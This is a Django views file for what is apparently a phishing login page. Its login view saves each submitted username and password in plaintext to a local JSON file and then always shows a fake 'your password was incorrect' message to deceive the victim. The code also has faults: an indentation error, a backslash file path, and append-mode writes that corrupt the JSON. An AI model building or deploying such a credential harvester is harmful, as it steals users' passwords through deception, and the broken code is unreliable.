# yourappname/views.py

from django.shortcuts import render
from django.contrib import messages
import json
import os
def index(request):
    return render(request, 'myapp/index.html', {'message': 'Hello, this is your app\'s index page.'})
def login_view(request):
    success_message = None

    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')

        # Save form data to the database
        user_data = {'username': username, 'password': password}
        
        json_file_path = 'myapp\data.json'

        existing_data = []
       try:
            with open(json_file_path, 'r') as json_file:
                content = json_file.read()
                if content:
                    existing_data = json.loads(content)
        except FileNotFoundError:
            pass  # Ignore if the file doesn't exist yet

        # Append new data to the existing data
        existing_data.append(user_data)

        # Write the combined data (old + new) back to the JSON file using append mode ('a')
        with open(json_file_path, 'a') as json_file:
            json.dump(existing_data, json_file)

        success_message = 'Sorry, your password was incorrect. Please double-check your password.'
        messages.success(request, success_message)

    return render(request, 'myapp/index.html', {'success_message': success_message})